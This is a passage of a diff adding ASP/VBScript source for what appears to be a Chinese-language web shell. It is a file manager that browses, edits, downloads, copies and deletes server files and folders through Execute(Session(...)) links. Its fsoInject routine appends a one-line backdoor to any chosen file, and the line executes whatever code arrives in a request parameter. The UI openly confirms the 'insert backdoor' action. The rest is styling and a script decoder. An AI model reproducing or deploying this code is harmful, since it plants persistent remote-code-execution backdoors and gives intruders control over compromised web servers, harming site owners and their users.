+Response.Write "&lt;td height=""50"" align=""right""> &lt;input type=""button"" name=""Submit"" value=""保 存"" onClick=""if(confirm('确认保存修改?')){this.form.submit();}"">" &amp; vbNewLine
+Response.Write "&lt;input type=""reset"" value=""重 置"">" &amp; vbNewLine
+Response.Write "&amp;nbsp; &lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;/table>" &amp; vbNewLine
+		set theFile=nothing
+		
+		showExecuteTime()
+	end sub
+	sub fsoGetFolderList(thePath,showFolder)
+		dim ext,flag,list,theHref,theFiles,fileName,theFolder,theFolders
+		
+		if not fso.folderExists(thePath) then
+			onErr("路径错误或者盘空或者没有权限的访问!")
+		end if
+		
+		if len(thePath)=2 then
+			thePath=thePath&amp;"\"
+		end if
+		
+		set theFolder=fso.getFolder(thePath)
+		set theFiles=theFolder.files
+		set theFolders=theFolder.subFolders
+		if showFolder=true and getParentFolder(thePath)&lt;>"" then
+			echo "&amp;nbsp;&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=fso&amp;thePath="&amp;encodeForUrl(getParentFolder(thePath),false)&amp;""">&lt;font class=warningColor>↑回上级目录&lt;/font>&lt;/a>&lt;br>"
+		end if
+		if showFolder=true then
+			for each list in theFolders
+				echo "&amp;nbsp;&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=fso&amp;thePath="&amp;encodeForUrl(list.path,false)&amp;""">&lt;font class=font-list>└■&lt;/font> "
+				echo replace(replace(lcase(list.path),lcase(thePath),""),"\","")&amp;""
+				echo "&lt;/a> &lt;a href=javascript:; onclick=""fso_delFolder('"&amp;encodeForUrl(list.path,true)&amp;"','"&amp;encodeForUrl(list.path, False)&amp;"')"">×删除&lt;/a>&lt;br>"
+			next
+		 else
+			echo "&lt;table width=""98%"" border=""1"" align=""center"" cellpadding=""0"" cellspacing=""0"">"
+			echo "&lt;tr>&lt;td align=""center"" class=""td"">文件名 (鼠标移到文件名可以查看给文件的属性)&lt;/TD>"
+			echo "&lt;TD align=""center"" class=""td"">大小&lt;/TD>"
+			echo "&lt;TD align=""center"" class=""td"">文件操作&lt;/TD>&lt;/tr>"
+			for each list in theFiles
+				ext=split(list.path,".")(uBound(split(list.path,".")))
+				flag=instr(lcase(editableFileExt),lcase("$"&amp;ext&amp;"$"))
+				fileName=replace(replace(lcase(list.path),lcase(thePath),""),"\","")
+				if instr(lcase(list.path),lcase(server.mapPath("\"))) then
+					theHref=mid(replace(lcase(list.path),lcase(server.mapPath("\")),""),2)
+					echo "&lt;tr onmouseover=""this.className='td';"" onmouseout=""this.className=''"">&lt;td>&amp;nbsp;&lt;font class=font-list>□&lt;/font>"
+					echo "&lt;a href=""\"&amp;encodeForUrl(theHref,false)&amp;""" title=""文件名: "&amp;fileName&amp;chr(13)&amp;"类型: "&amp;list.type&amp;chr(13)&amp;"属性: "&amp;list.Attributes&amp;chr(13)&amp;"时间："&amp;list.DateLastModified&amp;""" target=""_blank"">"
+					if getStrLen(fileName)>40 then
+						fileName=getCutStr(fileName,40)&amp;".."
+					end if
+					echo fileName&amp;"&lt;/a>&lt;/td>"
+				 else
+					echo "&lt;tr onmouseover=""this.className='td';"" onmouseout=""this.className=''"">&lt;td>&amp;nbsp;&lt;font class=font-list>□&lt;/font>"
+					echo "&lt;font style=""cursor: hand;"" title=""文件名: "&amp;fileName&amp;chr(13)&amp;"类型: "&amp;list.type&amp;chr(13)&amp;"属性: "&amp;list.Attributes&amp;chr(13)&amp;"时间："&amp;list.DateLastModified&amp;""">"
+					if getStrLen(fileName)>40 then
+						fileName=getCutStr(fileName,40)&amp;".."
+					end if
+					echo fileName&amp;"&lt;/font>&lt;/td>"
+				end if
+				echo "&lt;td align=center>" &amp; getTheSize(list.size) &amp; "&lt;/td>&lt;td align=center>"
+				if flag>0 then
+					echo "&lt;a href=#foot onclick=""fso_editIt('" &amp; encodeForUrl(list.path, False) &amp; "');"">&lt;font class=warningColor>Edit&lt;/font>&lt;/a> "
+				end if
+				echo "&lt;a href=javascript:; onclick=""fso_saveAs('"&amp;encodeForUrl(list.path,true)&amp;"','" &amp; encodeForUrl(list.path, False) &amp; "');"">&lt;font class=warningColor>SaveAs&lt;/font>&lt;/a> "
+				echo "&lt;a href=javascript:; onclick=""stream_downIt('"&amp;encodeForUrl(list.path, False)&amp;"');"">&lt;font class=warningColor>Down&lt;/font>&lt;/a> "
+				echo "&lt;a href=javascript:; onclick=""fso_delFile('"&amp;encodeForUrl(list.path,true)&amp;"','" &amp; encodeForUrl(list.path, False) &amp; "')"">&lt;font class=warningColor>Del&lt;/font>&lt;/a> "
+				if flag>0 then
+					echo "&lt;a href=javascript:; onclick=""fso_inject('"&amp;encodeForUrl(list.path,true)&amp;"','" &amp; encodeForUrl(list.path, False) &amp; "')"">&lt;font class=warningColor>Inject&lt;/font>&lt;/a>"
+				end if
+				echo "&lt;/td>&lt;/tr>"&amp;vbNewline
+			next
+			echo "&lt;/table>"
+		end if
+	end sub
+	
+	sub fsoSaveAs(thePath,toPath)
+		if lTrim(thePath)=lTrim(toPath) then
+			echo "&lt;script>alert('源路径与目标路径相同,操作停止!');&lt;/script>"
+			response.end
+		end if
+	 	if fso.fileExists(thePath) then 
+			fso.copyFile thePath,toPath
+			echo "&lt;script language=""javascript"">alert('另存为操作成功!');&lt;/script>"
+		 else
+			echo "&lt;script>alert('请确认源文件存在！');history.back();&lt;/script>"
+		end if
+	end sub
+	
+	sub fsoInject(thePath)
+		dim theFile
+		set theFile=fso.openTextFile(thePath,8,True,0)
+		theFile.writeLine(" &lt;script language=""vbscript"" runat=server>if request("""&amp;clientPassword&amp;""")&lt;>"""" then execute(request("""&amp;clientPassword&amp;"""))&lt;/script>")
+		theFile.close
+		echo "&lt;script language=""javascript"">alert('插入成功!请用海阳顶端网asp后门来访问你插入的文件"&amp;request("path")&amp;"');&lt;/script>"
+		set theFile=nothing
+	end sub
+	
+	sub fsoSaveToFile(thePath,fileContent)
+		dim theFile
+		set theFile=fso.openTextFile(thePath,2,true)
+		theFile.write fileContent
+		theFile.close
+		echo "文件保存成功! [&lt;a href="""&amp;request.serverVariables("http_referer")&amp;""">返回&lt;/a>]"
+		set theFile=nothing
+	end sub
+	
+	sub fsoDelFile(thePath)
+		dim theFile
+		set theFile=fso.getFile(thePath)
+		theFile.delete true
+		set theFile=nothing
+	end sub
+	
+	sub fsoDelFolder(thePath)
+		fso.deleteFolder thePath,true
+	end sub
+	
+	sub searchFolder(folder,str)
+		dim ext,n,title,theFile,theFolder
+		for each theFile In folder.Files
+			ext=split(theFile,".")(uBound(split(theFile,".")))
+			if lcase(ext)="asp" or lcase(ext)="asa" or lcase(ext)="cer"  or lcase(ext)="cdx" then
+				if searchFile(theFile,str,title) then
+					echo fileLink(theFile,title)
+					n=n+1
+				end if
+			end if
+		next
+		for each theFolder in folder.subFolders
+			searchFolder theFolder,str
+		next
+	end sub
+	
+	function searchFile(f,s,title)
+		dim fo,content,pos1,pos2
+		set fo=fso.openTextFile(f)
+		on error resume next
+		content=fo.ReadAll()
+		fo.close
+		if err then
+			err.clear
+			content=""
+		end if
+		searchFile=instr(1,content,S,vbTextCompare)>0 
+		if searchFile then
+			pos1=instr(1,content,"&lt;TITLE>",vbTextCompare)
+			pos2=instr(1,content,"&lt;/TITLE>",vbTextCompare)
+			title=""
+			if pos1>0 and pos2>0 then
+				title=mid(content,pos1+7,pos2-pos1-7)
+			end if
+		end if
+		set fo=nothing
+	end function
+	
+	function fileLink(f,title)
+		fileLink=f.path
+		if title="" then
+			title=f.Name
+		end if
+		fileLink="&lt;UL>·"&amp;title&amp;" "&amp;fileLink&amp;"&lt;/UL>"
+	end function
+	sub pageOther()
+Response.Write "&lt;style>" &amp; vbNewLine
+Response.Write "BODY {" &amp; vbNewLine
+Response.Write "FONT-SIZE: 9pt;" &amp; vbNewLine
+Response.Write "COLOR: #000000;" &amp; vbNewLine
+Response.Write "FONT-FAMILY: ""Courier New"";" &amp; vbNewLine
+Response.Write "scrollbar-face-color:#E4E4F3;" &amp; vbNewLine
+Response.Write "scrollbar-highlight-color:#FFFFFF;" &amp; vbNewLine
+Response.Write "scrollbar-3dlight-color:#E4E4F3;" &amp; vbNewLine
+Response.Write "scrollbar-darkshadow-color:#9C9CD3;" &amp; vbNewLine
+Response.Write "scrollbar-shadow-color:#E4E4F3;" &amp; vbNewLine
+Response.Write "scrollbar-arrow-color:#4444B3;" &amp; vbNewLine
+Response.Write "scrollbar-track-color:#EFEFEF;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "TABLE {" &amp; vbNewLine
+Response.Write "FONT-SIZE: 9pt;" &amp; vbNewLine
+Response.Write "FONT-FAMILY: ""Courier New"";" &amp; vbNewLine
+Response.Write "BORDER-COLLAPSE: collapse;" &amp; vbNewLine
+Response.Write "border-top-width: 1px;" &amp; vbNewLine
+Response.Write "border-right-width: 1px;" &amp; vbNewLine
+Response.Write "border-bottom-width: 1px;" &amp; vbNewLine
+Response.Write "border-left-width: 1px;" &amp; vbNewLine
+Response.Write "border-top-style: solid;" &amp; vbNewLine
+Response.Write "border-right-style: none;" &amp; vbNewLine
+Response.Write "border-bottom-style: none;" &amp; vbNewLine
+Response.Write "border-left-style: solid;" &amp; vbNewLine
+Response.Write "border-top-color: #d8d8f0;" &amp; vbNewLine
+Response.Write "border-right-color: #d8d8f0;" &amp; vbNewLine
+Response.Write "border-bottom-color: #d8d8f0;" &amp; vbNewLine
+Response.Write "border-left-color: #d8d8f0;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write ".tr {" &amp; vbNewLine
+Response.Write "font-family: ""Courier New"";" &amp; vbNewLine
+Response.Write "font-size: 9pt;" &amp; vbNewLine
+Response.Write "background-color: #e4e4f3;" &amp; vbNewLine
+Response.Write "text-align: center;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write ".td {" &amp; vbNewLine
+Response.Write "font-family: ""Courier New"";" &amp; vbNewLine
+Response.Write "font-size: 9pt;" &amp; vbNewLine
+Response.Write "background-color: #f9f9fd;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write ".warningColor {" &amp; vbNewLine
+Response.Write "font-family: ""Courier New"";" &amp; vbNewLine
+Response.Write "font-size: 9pt;" &amp; vbNewLine
+Response.Write "color: #ff0000;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "input {" &amp; vbNewLine
+Response.Write "font-family: ""Courier New"";" &amp; vbNewLine
+Response.Write "BORDER-TOP-WIDTH: 1px;" &amp; vbNewLine
+Response.Write "BORDER-LEFT-WIDTH: 1px;" &amp; vbNewLine
+Response.Write "FONT-SIZE: 12px;" &amp; vbNewLine
+Response.Write "BORDER-BOTTOM-WIDTH: 1px;" &amp; vbNewLine
+Response.Write "BORDER-RIGHT-WIDTH: 1px;" &amp; vbNewLine
+Response.Write "color: #000000;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "textarea {" &amp; vbNewLine
+Response.Write "font-family: ""Courier New"";" &amp; vbNewLine
+Response.Write "BORDER-TOP-WIDTH: 1px;" &amp; vbNewLine
+Response.Write "BORDER-LEFT-WIDTH: 1px;" &amp; vbNewLine
+Response.Write "FONT-SIZE: 12px;" &amp; vbNewLine
+Response.Write "BORDER-BOTTOM-WIDTH: 1px;" &amp; vbNewLine
+Response.Write "BORDER-RIGHT-WIDTH: 1px;" &amp; vbNewLine
+Response.Write "color: #000000;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "A:visited {" &amp; vbNewLine
+Response.Write "FONT-SIZE: 9pt;" &amp; vbNewLine
+Response.Write "COLOR: #333333;" &amp; vbNewLine
+Response.Write "FONT-FAMILY: ""Courier New"";" &amp; vbNewLine
+Response.Write "TEXT-DECORATION: none;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "A:active {" &amp; vbNewLine
+Response.Write "FONT-SIZE: 9pt;" &amp; vbNewLine
+Response.Write "COLOR: #3366cc;" &amp; vbNewLine
+Response.Write "FONT-FAMILY: ""Courier New"";" &amp; vbNewLine
+Response.Write "TEXT-DECORATION: none;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "A:link {" &amp; vbNewLine
+Response.Write "FONT-SIZE: 9pt;" &amp; vbNewLine
+Response.Write "COLOR: #000000;" &amp; vbNewLine
+Response.Write "FONT-FAMILY: ""Courier New"";" &amp; vbNewLine
+Response.Write "TEXT-DECORATION: none;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "A:hover {" &amp; vbNewLine
+Response.Write "FONT-SIZE: 9pt;" &amp; vbNewLine
+Response.Write "COLOR: #3366cc;" &amp; vbNewLine
+Response.Write "FONT-FAMILY: ""Courier New"";" &amp; vbNewLine
+Response.Write "TEXT-DECORATION: none;" &amp; vbNewLine
+Response.Write "}tr {" &amp; vbNewLine
+Response.Write "font-family: ""Courier New"";" &amp; vbNewLine
+Response.Write "font-size: 9pt;" &amp; vbNewLine
+Response.Write "line-height: 18px;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "td {" &amp; vbNewLine
+Response.Write "font-family: ""Courier New"";" &amp; vbNewLine
+Response.Write "font-size: 9pt;" &amp; vbNewLine
+Response.Write "border-top-width: 1px;" &amp; vbNewLine
+Response.Write "border-right-width: 1px;" &amp; vbNewLine
+Response.Write "border-bottom-width: 1px;" &amp; vbNewLine
+Response.Write "border-left-width: 1px;" &amp; vbNewLine
+Response.Write "border-top-style: none;" &amp; vbNewLine
+Response.Write "border-right-style: solid;" &amp; vbNewLine
+Response.Write "border-bottom-style: solid;" &amp; vbNewLine
+Response.Write "border-left-style: none;" &amp; vbNewLine
+Response.Write "border-top-color: #d8d8f0;" &amp; vbNewLine
+Response.Write "border-right-color: #d8d8f0;" &amp; vbNewLine
+Response.Write "border-bottom-color: #d8d8f0;" &amp; vbNewLine
+Response.Write "border-left-color: #d8d8f0;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write ".trHead {" &amp; vbNewLine
+Response.Write "font-family: ""Courier New"";" &amp; vbNewLine
+Response.Write "font-size: 9pt;" &amp; vbNewLine
+Response.Write "background-color: #e4e4f3;" &amp; vbNewLine
+Response.Write "line-height: 3px;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write ".inputLogin {" &amp; vbNewLine
+Response.Write "font-family: ""Courier New"";" &amp; vbNewLine
+Response.Write "font-size: 9pt;" &amp; vbNewLine
+Response.Write "border: 1px solid #d8d8f0;" &amp; vbNewLine
+Response.Write "background-color: #f9f9fd;" &amp; vbNewLine
+Response.Write "vertical-align: bottom;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write ".font-list {" &amp; vbNewLine
+Response.Write "font-size: 9pt;" &amp; vbNewLine
+Response.Write "color: CCCCFF;" &amp; vbNewLine
+Response.Write "font-family: ""Courier New"";" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "&lt;/style>" &amp; vbNewLine
+Response.Write "&lt;script lanuage=""javascript"">" &amp; vbNewLine
+Response.Write "//页面上一些要用到的JS,Marcos编写." &amp; vbNewLine
+Response.Write "function default_canLogin(frm){" &amp; vbNewLine
+Response.Write "if(frm.password.value==""""){" &amp; vbNewLine
+Response.Write "alert(""请先输入密码!"");" &amp; vbNewLine
+Response.Write "return false;" &amp; vbNewLine
+Response.Write "}else{" &amp; vbNewLine
+Response.Write "frm.Submit.disabled=true;" &amp; vbNewLine
+Response.Write "return true;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "function stream_editIt(thePath){" &amp; vbNewLine
+Response.Write "loaded.style.display=""block"";" &amp; vbNewLine
+Response.Write "fileEditor.location.href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=stream&amp;thePath=""+thePath+""&amp;theAct=edit"";" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "function stream_downIt(thePath){" &amp; vbNewLine
+Response.Write "loaded.style.display=""none"";" &amp; vbNewLine
+Response.Write "if(confirm(""如果该文件超过20M,\n建议不要通过流方式下载\n这样会占用服务器大量的资源\n并可能导致服务器死机!\n您可以先用FSO把文件复制到网站目录下,\n然后通过http协议来下载.\n按\""确定\""用流来进行下载."")){" &amp; vbNewLine
+Response.Write "fileEditor.location.href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=stream&amp;thePath=""+thePath+""&amp;theAct=down"";" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "function stream_saveAs(frm,thePath){" &amp; vbNewLine
+Response.Write "if(frm.thePath.value=prompt('请输入要保存的文件的绝对路径!',thePath)){" &amp; vbNewLine
+Response.Write "if(frm.thePath.value==null||frm.thePath.value==''){" &amp; vbNewLine
+Response.Write "return false;" &amp; vbNewLine
+Response.Write "}else{" &amp; vbNewLine
+Response.Write "frm.submit();" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "function stream_saveAsTwo(thePath, thePath2){" &amp; vbNewLine
+Response.Write "var url;" &amp; vbNewLine
+Response.Write "if(url=prompt('请输入要保存的文件的绝对路径!\n目标文件存在则覆盖.',thePath)){" &amp; vbNewLine
+Response.Write "if(url==null||url==''){" &amp; vbNewLine
+Response.Write "return false;" &amp; vbNewLine
+Response.Write "}else{" &amp; vbNewLine
+Response.Write "loaded.style.display=""none"";" &amp; vbNewLine
+Response.Write "fileEditor.location.href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=stream&amp;theAct=saveAsTwo&amp;thePath=""+thePath2+""&amp;toPath=""+url;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "function fso_editIt(thePath){" &amp; vbNewLine
+Response.Write "loaded.style.display=""block"";" &amp; vbNewLine
+Response.Write "fileEditor.location.href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=fso&amp;thePath=""+thePath+""&amp;theAct=edit"";" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "function fso_saveAs(thePath, thePath2){" &amp; vbNewLine
+Response.Write "var url;" &amp; vbNewLine
+Response.Write "if(url=prompt('请输入要保存的文件的绝对路径!\n目标文件存在则覆盖.',thePath)){" &amp; vbNewLine
+Response.Write "if(url==null||url==''){" &amp; vbNewLine
+Response.Write "return false;" &amp; vbNewLine
+Response.Write "}else{" &amp; vbNewLine
+Response.Write "loaded.style.display=""none"";" &amp; vbNewLine
+Response.Write "fileEditor.location.href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=fso&amp;theAct=saveAs&amp;thePath=""+thePath2+""&amp;toPath=""+url;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "function fso_delFile(thePath, thePath2){" &amp; vbNewLine
+Response.Write "if(confirm(""确认要删除这个文件吗?\n""+thePath)){" &amp; vbNewLine
+Response.Write "loaded.style.display=""none"";" &amp; vbNewLine
+Response.Write "fileEditor.location.href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=fso&amp;theAct=delFile&amp;thePath=""+thePath2;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "function fso_inject(thePath, thePath2){" &amp; vbNewLine
+Response.Write "if(confirm(""确认要插入后门吗?\n""+thePath)){" &amp; vbNewLine
+Response.Write "loaded.style.display=""none"";" &amp; vbNewLine
+Response.Write "fileEditor.location.href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=fso&amp;theAct=inject&amp;thePath=""+thePath2;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "function fso_delFolder(thePath, thePath2){" &amp; vbNewLine
+Response.Write "if(confirm(""确认要删除这个目录吗?\n""+thePath)){" &amp; vbNewLine
+Response.Write "loaded.style.display=""none"";" &amp; vbNewLine
+Response.Write "fileEditor.location.href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=fso&amp;theAct=delFolder&amp;thePath=""+thePath2;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "function upload_canSubmit(frm){" &amp; vbNewLine
+Response.Write "if(frm.fileName.value==''){" &amp; vbNewLine
+Response.Write "alert('请填写上传后的文件名!');" &amp; vbNewLine
+Response.Write "return false;" &amp; vbNewLine
+Response.Write "}else{" &amp; vbNewLine
+Response.Write "if(frm.file.value==''){" &amp; vbNewLine
+Response.Write "alert('请选择要上传的文件!');" &amp; vbNewLine
+Response.Write "return false;" &amp; vbNewLine
+Response.Write "}else{" &amp; vbNewLine
+Response.Write "frm.action+='&amp;fileName='+frm.fileName.value;" &amp; vbNewLine
+Response.Write "frm.Submit.disabled=true;" &amp; vbNewLine
+Response.Write "return true;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "function showMenu(){" &amp; vbNewLine
+Response.Write "if(top.location==location.href){" &amp; vbNewLine
+Response.Write "menu.style.display="""";" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "//以下代码抄袭,不过忘记是从哪里抄的了,做过一点修改" &amp; vbNewLine
+Response.Write "var Words;" &amp; vbNewLine
+Response.Write "function SetWords(word){" &amp; vbNewLine
+Response.Write "Words=word.value;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "function SetNewWords(form){" &amp; vbNewLine
+Response.Write "var NewWords;" &amp; vbNewLine
+Response.Write "NewWords=unescape(Words);" &amp; vbNewLine
+Response.Write "form.NewWords.value=NewWords;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "function SetNewWords1(form){" &amp; vbNewLine
+Response.Write "var NewWords;" &amp; vbNewLine
+Response.Write "NewWords=escape(Words);" &amp; vbNewLine
+Response.Write "form.NewWords.value=NewWords;" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "function screncode(s,l){" &amp; vbNewLine
+Response.Write "enc=new ActiveXObject(""Scripting.Encoder"");" &amp; vbNewLine
+Response.Write "return enc.EncodeScriptFile("".""+l,s,0,l+""cript"");" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "var STATE_COPY_INPUT=100" &amp; vbNewLine
+Response.Write "var STATE_READLEN=101" &amp; vbNewLine
+Response.Write "var STATE_DECODE=102" &amp; vbNewLine
+Response.Write "var STATE_UNESCAPE=103" &amp; vbNewLine
+Response.Write "var pick_encoding=new Array(" &amp; vbNewLine
+Response.Write "1,2,0,1,2,0,2,0,0,2,0,2,1,0,2,0," &amp; vbNewLine
+Response.Write "1,0,2,0,1,1,2,0,0,2,1,0,2,0,0,2," &amp; vbNewLine
+Response.Write "1,1,0,2,0,2,0,1,0,1,1,2,0,1,0,2," &amp; vbNewLine
+Response.Write "1,0,2,0,1,1,2,0,0,1,1,2,0,1,0,2" &amp; vbNewLine
+Response.Write ")" &amp; vbNewLine
+Response.Write "var rawData=new Array(" &amp; vbNewLine
+Response.Write "0x64,0x37,0x69,0x50,0x7E,0x2C,0x22,0x5A,0x65,0x4A,0x45,0x72," &amp; vbNewLine
+Response.Write "0x61,0x3A,0x5B,0x5E,0x79,0x66,0x5D,0x59,0x75,0x5B,0x27,0x4C," &amp; vbNewLine
+Response.Write "0x42,0x76,0x45,0x60,0x63,0x76,0x23,0x62,0x2A,0x65,0x4D,0x43," &amp; vbNewLine
+Response.Write "0x5F,0x51,0x33,0x7E,0x53,0x42,0x4F,0x52,0x20,0x52,0x20,0x63," &amp; vbNewLine
+Response.Write "0x7A,0x26,0x4A,0x21,0x54,0x5A,0x46,0x71,0x38,0x20,0x2B,0x79," &amp; vbNewLine
+Response.Write "0x26,0x66,0x32,0x63,0x2A,0x57,0x2A,0x58,0x6C,0x76,0x7F,0x2B," &amp; vbNewLine
+Response.Write "0x47,0x7B,0x46,0x25,0x30,0x52,0x2C,0x31,0x4F,0x29,0x6C,0x3D," &amp; vbNewLine
+Response.Write "0x69,0x49,0x70,0x3F,0x3F,0x3F,0x27,0x78,0x7B,0x3F,0x3F,0x3F," &amp; vbNewLine
+Response.Write "0x67,0x5F,0x51,0x3F,0x3F,0x3F,0x62,0x29,0x7A,0x41,0x24,0x7E," &amp; vbNewLine
+Response.Write "0x5A,0x2F,0x3B,0x66,0x39,0x47,0x32,0x33,0x41,0x73,0x6F,0x77," &amp; vbNewLine
+Response.Write "0x4D,0x21,0x56,0x43,0x75,0x5F,0x71,0x28,0x26,0x39,0x42,0x78," &amp; vbNewLine
+Response.Write "0x7C,0x46,0x6E,0x53,0x4A,0x64,0x48,0x5C,0x74,0x31,0x48,0x67," &amp; vbNewLine
+Response.Write "0x72,0x36,0x7D,0x6E,0x4B,0x68,0x70,0x7D,0x35,0x49,0x5D,0x22," &amp; vbNewLine
+Response.Write "0x3F,0x6A,0x55,0x4B,0x50,0x3A,0x6A,0x69,0x60,0x2E,0x23,0x6A," &amp; vbNewLine
+Response.Write "0x7F,0x09,0x71,0x28,0x70,0x6F,0x35,0x65,0x49,0x7D,0x74,0x5C," &amp; vbNewLine
+Response.Write "0x24,0x2C,0x5D,0x2D,0x77,0x27,0x54,0x44,0x59,0x37,0x3F,0x25," &amp; vbNewLine
+Response.Write "0x7B,0x6D,0x7C,0x3D,0x7C,0x23,0x6C,0x43,0x6D,0x34,0x38,0x28," &amp; vbNewLine
+Response.Write "0x6D,0x5E,0x31,0x4E,0x5B,0x39,0x2B,0x6E,0x7F,0x30,0x57,0x36," &amp; vbNewLine
+Response.Write "0x6F,0x4C,0x54,0x74,0x34,0x34,0x6B,0x72,0x62,0x4C,0x25,0x4E," &amp; vbNewLine
+Response.Write "0x33,0x56,0x30,0x56,0x73,0x5E,0x3A,0x68,0x73,0x78,0x55,0x09," &amp; vbNewLine
+Response.Write "0x57,0x47,0x4B,0x77,0x32,0x61,0x3B,0x35,0x24,0x44,0x2E,0x4D," &amp; vbNewLine
+Response.Write "0x2F,0x64,0x6B,0x59,0x4F,0x44,0x45,0x3B,0x21,0x5C,0x2D,0x37," &amp; vbNewLine
+Response.Write "0x68,0x41,0x53,0x36,0x61,0x58,0x58,0x7A,0x48,0x79,0x22,0x2E," &amp; vbNewLine
+Response.Write "0x09,0x60,0x50,0x75,0x6B,0x2D,0x38,0x4E,0x29,0x55,0x3D,0x3F" &amp; vbNewLine
+Response.Write ")" &amp; vbNewLine
+Response.Write "var transformed=new Array()" &amp; vbNewLine
+Response.Write "for (var i=0; i&lt;3; i++) transformed[i]=new Array()" &amp; vbNewLine
+Response.Write "for (var i=31; i&lt;=126; i++) for (var j=0; j&lt;3; j++) transformed[j][rawData[(i-31) * 3+j]]=(i==31)?9:i" &amp; vbNewLine
+Response.Write "var digits=new Array()" &amp; vbNewLine
+Response.Write "for (var i=0; i&lt;26; i++){" &amp; vbNewLine
+Response.Write "digits[""A"".charCodeAt(0)+i]=i" &amp; vbNewLine
+Response.Write "digits[""a"".charCodeAt(0)+i]=i+26" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "for (var i=0; i&lt;10; i++) digits[""0"".charCodeAt(0)+i]=i+52" &amp; vbNewLine
+Response.Write "digits[0x2b]=62" &amp; vbNewLine
+Response.Write "digits[0x2f]=63" &amp; vbNewLine
+Response.Write "function unescape2(char){" &amp; vbNewLine
+Response.Write "var escapes=""#&amp;!*$""" &amp; vbNewLine
+Response.Write "var escaped=""\r\n&lt;>@""" &amp; vbNewLine
+Response.Write "if (char.charCodeAt(0) > 126) return char" &amp; vbNewLine
+Response.Write "if (escapes.indexOf(char)!=-1) return escaped.substr(escapes.indexOf(char),1)" &amp; vbNewLine
+Response.Write "return ""?""" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "function decodeBase64(string){" &amp; vbNewLine
+Response.Write "var val=0" &amp; vbNewLine
+Response.Write "val+=(digits[string.substr(0,1).charCodeAt(0)]&lt;&lt;2)" &amp; vbNewLine
+Response.Write "val+=(digits[string.substr(1,1).charCodeAt(0)]>>4)" &amp; vbNewLine
+Response.Write "val+=(digits[string.substr(1,1).charCodeAt(0)]&amp;0xf)&lt;&lt;12" &amp; vbNewLine
+Response.Write "val+=((digits[string.substr(2,1).charCodeAt(0)]>>2)&lt;&lt;8)" &amp; vbNewLine
+Response.Write "val+=((digits[string.substr(2,1).charCodeAt(0)]&amp;0x3)&lt;&lt;22)" &amp; vbNewLine
+Response.Write "val+=(digits[string.substr(3,1).charCodeAt(0)]&lt;&lt;16)" &amp; vbNewLine
+Response.Write "return val" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "function strdec(encodingString){" &amp; vbNewLine
+Response.Write "var marker=""#@~^""" &amp; vbNewLine
+Response.Write "var stringIndex=0" &amp; vbNewLine
+Response.Write "var scriptIndex=-1" &amp; vbNewLine
+Response.Write "var unEncodingIndex=0" &amp; vbNewLine
+Response.Write "var char=null" &amp; vbNewLine
